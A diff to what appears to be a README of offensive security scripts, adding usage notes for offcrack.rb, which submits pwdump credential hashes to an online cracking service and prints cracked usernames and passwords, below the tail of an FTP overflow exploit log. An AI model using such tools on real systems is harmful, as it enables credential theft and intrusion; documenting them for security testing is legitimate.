@@ -166,3 +166,21 @@ PASS ftp
 [*] Deliverying the payload...
 APPE ��������������������������....
 ```
+
+offcrack.rb
+------------
+
+It is a trivial wrapper that reads pwdump file and uses http://cracker.offensive-security.com 
+to crack the hashes. Please note that Offsec has blocked access to people without a valid
+priority code.
+
+Example usage:
+
+```
+# ./offcrack.rb -c 12345678 /tmp/pwdump
+admin:password123
+Administrator:Y1M125H9fop
+alice:!Q2w#E4r
+backup:backup
+bikingviking:bikingviking
+```
